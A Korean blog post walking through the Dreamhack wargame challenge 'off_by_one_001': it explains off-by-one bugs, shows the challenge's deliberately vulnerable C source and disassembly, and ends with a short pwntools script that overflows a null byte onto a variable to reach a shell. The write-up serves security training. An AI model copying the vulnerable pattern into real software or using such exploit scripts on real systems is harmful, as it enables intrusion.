---
layout: post
title: Dreamhack | Off By One_001
subtitle: Dreamhack-Pwnable off_by_one_001
categories: dreamhack.io
tags: [Pwnable, dreakhack, Shell, Pentest]
---

**본 문제는 Dreamhack을 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

문제는 <a href = "https://dreamhack.io/wargame/challenges/">dreamhack.io</a>를 들어가시면 확인할 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/208598925-b1606edf-c200-44d1-ae51-02a10c66fa8c.png" width = 550>
</p>

**Off-by-one 취약점**은 경계 검사에서 하나의 오차가 있을 때 발생하는 취약점입니다. 이는 버퍼의 경계 계산 혹은 반복문의 횟수 계산 시 `<` 대신 `<=`을 쓰거나, 0부터 시작하는 인덱스를 고려하지 못할 때 발생합니다.

## 문제 풀이

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_str(char *ptr, int size)
{
    int len;
    len = read(0, ptr, size);
    printf("%d", len);
    ptr[len] = '\0';
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char name[20];
    int age = 1;

    initialize();

    printf("Name: ");
    read_str(name, 20);

    printf("Are you baby?");

    if (age == 0)
    {
        get_shell();
    }
    else
    {
        printf("Ok, chance: \n");
        read(0, name, 20);
    }

    return 0;
}
```

**1**로 초기화 된 `age`가 **0**이 되면 `get_shell()`함수를 통해 풀이가 되는 것을 알 수 있다.

```armasm
// main functions
0x08048657 <+3>:     sub    esp,0x18
0x0804865a <+6>:     mov    DWORD PTR [ebp-0x4],0x1 // age
0x08048673 <+31>:    push   0x14
0x08048675 <+33>:    lea    eax,[ebp-0x18]
0x08048678 <+36>:    push   eax
0x08048679 <+37>:    call   0x8048609 <read_str> // name
```

총 24byte를 할당하며 name의 해당 위치는 `ebp-0x18`, age의 해당 위치는 `ebp-0x4`에 **1**이 들어가있는 것을 알 수 있다.

```armasm
// read_str functions
0x0804860f <+6>:     mov    eax,DWORD PTR [ebp+0xc]
0x08048612 <+9>:     push   eax
0x08048613 <+10>:    push   DWORD PTR [ebp+0x8]
0x08048616 <+13>:    push   0x0
0x08048618 <+15>:    call   0x8048410 <read@plt>
```

하지만, age를 직접적으로 변경하는 부분은 보이지 않지만 `read_str()`를 보게 되면, **\*ptr**에 20byte의 크기를 넣게 된다면 `len`의 변수는 총 20이 되며, `ptr[len]`를 통해 age 값이 0으로 변경된다.

```python
from pwn import *

p = remote('host3.dreamhack.games', 19601)
payload = "A" * 20

p.sendline(payload)
p.interactive()
```